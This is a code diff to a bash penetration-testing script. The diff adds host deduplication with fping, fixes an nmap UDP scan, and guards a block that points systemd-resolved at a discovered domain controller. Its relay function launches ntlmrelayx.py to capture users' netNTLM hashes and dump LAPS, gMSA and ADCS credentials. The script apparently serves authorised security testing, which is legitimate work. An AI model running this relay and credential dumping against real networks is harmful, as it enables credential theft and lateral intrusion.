@@ -211,10 +211,11 @@ nmap_fast () {
 				rm $DIR/tmp_hosts.txt
 			else
 				fping -g $rangeIP_array_key --alive | grep -v $MY_IP >> $DIR/hosts.txt 2>/dev/null
+    				sort -u $DIR/hosts.txt -o $DIR/hosts.txt
 			fi
 		done
 		NMAP_HOSTS="-Pn -iL $DIR/hosts.txt"
-		log "${SPACE}[!] $(wc -l $DIR/hosts.txt) hosts detected via arp / ping"
+		log "${SPACE}[!] $(wc -l < "$DIR/hosts.txt") hosts detected via arp / ping"
 	elif [ -z "$proxychains" ]; then
 		NMAP_HOSTS=$(echo "$rangeIP" | tr ',' ' ')
 	fi
@@ -244,7 +245,7 @@ nmap_fast () {
 		log "${SPACE}[📂] UDP Scanning ..."
 		#UDP
 		UDP_PORTS=$(nmap -Pn -sU $NMAP_HOSTS -R --open --top 25 -T4 --exclude $excluded_hosts | grep -v filtered | grep -oP '^\d+(?=/udp)' | paste -sd',' -)
-		nmap -Pn -sU $NMAP_HOSTS -R -oA $DIR/scan_nmap/scan_Full_UDP -p --open $UDP_PORTS --top 25 -T4 --exclude $excluded_hosts
+  		nmap -Pn -sU $NMAP_HOSTS -R -oA $DIR/scan_nmap/scan_Full_UDP -p $UDP_PORTS --open -T4 --exclude $excluded_hosts >/dev/null 2>&1
 	fi
 	
 	#log "${SPACE}[!] Nmap UDP report : ${DIR}/scan_nmap/scan_Full_UDP.nmap"
@@ -350,11 +351,9 @@ nmap_fast () {
 			FQDN=$(echo "$ligne" | grep 'Nmap scan report for' | awk '{if ($5 ~ /[a-zA-Z]/) print $5}')
 			regex_FQDN='FQDN: ([A-Za-z0-9.-]+)'
 			regex_RDP_info_DNS='DNS_Computer_Name: ([A-Za-z0-9.-]+)'
-			
 			if [[ $ligne =~ $regex_Host ]];then
 				host_nmap="${BASH_REMATCH[1]}"
 			fi
-			
 			if [ -n "$FQDN" ] && [[ ! "$FQDN" =~ \.lan$ ]] && [[ "$FQDN" =~ ^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$ ]]; then
 				echo "${ip}:${FQDN}" >> ${DIR}/hostname_file.txt
 				resolve="1"
@@ -400,17 +399,19 @@ nmap_fast () {
 	sort -u ${DIR}/hostname_file.txt -o ${DIR}/hostname_file.txt
 
 	#log "[!] Updating DNS resolver with potential domain found ... "
-	ip=$(cat ${DIR_PORTS}/636.txt ${DIR_PORTS}/389.txt | sort -u | head -n 1)
-	domain=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}' | cut -d '.' -f 2-)
-	
-	#Backup original file
-	if [ ! -f "/etc/systemd/resolved.conf.bkp" ]; then
-		cp /etc/systemd/resolved.conf /etc/systemd/resolved.conf.bkp
-	fi
-	cp /etc/systemd/resolved.conf.bkp /etc/systemd/resolved.conf
-	echo "DNS=${ip}" >> /etc/systemd/resolved.conf
-	echo "Domains=${domain}" >> /etc/systemd/resolved.conf
-	sudo systemctl restart systemd-resolved
+ 	if [ -s "${DIR_PORTS}/636.txt" ] || [ -s "${DIR_PORTS}/389.txt" ]; then
+		ip=$(cat ${DIR_PORTS}/636.txt ${DIR_PORTS}/389.txt | sort -u | head -n 1)
+		domain=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}' | cut -d '.' -f 2-)
+		
+		#Backup original file
+		if [ ! -f "/etc/systemd/resolved.conf.bkp" ]; then
+			cp /etc/systemd/resolved.conf /etc/systemd/resolved.conf.bkp
+		fi
+		cp /etc/systemd/resolved.conf.bkp /etc/systemd/resolved.conf
+		echo "DNS=${ip}" >> /etc/systemd/resolved.conf
+		echo "Domains=${domain}" >> /etc/systemd/resolved.conf
+		sudo systemctl restart systemd-resolved
+  	fi
 }
 
 ########################## SMB NTLM RELAY ##################################
@@ -450,14 +451,13 @@ relay () {
 				sleep 1
 				x-terminal-emulator -e "source /tmp/set_title_tab.sh RelayNTLM; ntlmrelayx.py -tf $DIR_VULNS/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
 			fi
-			green_log "${SPACE}[💀] NTLM Relay started, look at socks and folder $DIR_VULNS/NTLM_relay/ for user's netNTLM hashes"
+			blue_log "${SPACE}[💀] NTLM Relay started, look at socks and folder $DIR_VULNS/NTLM_relay/ for user's netNTLM hashes"
 		else
   			green_log "${SPACE}[💀] Found $nb_relay_vulnerable devices vulnerable to NTLM relay in the $rangeIP network -> $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt"
 			blue_log "${SPACE} [!] Impossible to launch NTLM Relay via proxychains"
 		fi
-		
 	else
-		#red_log "${SPACE}[X] No NTLM relay possible for this range $rangeIP"
+		red_log "${SPACE}[X] No NTLM relay possible for this range $rangeIP"
 	fi
 }
 
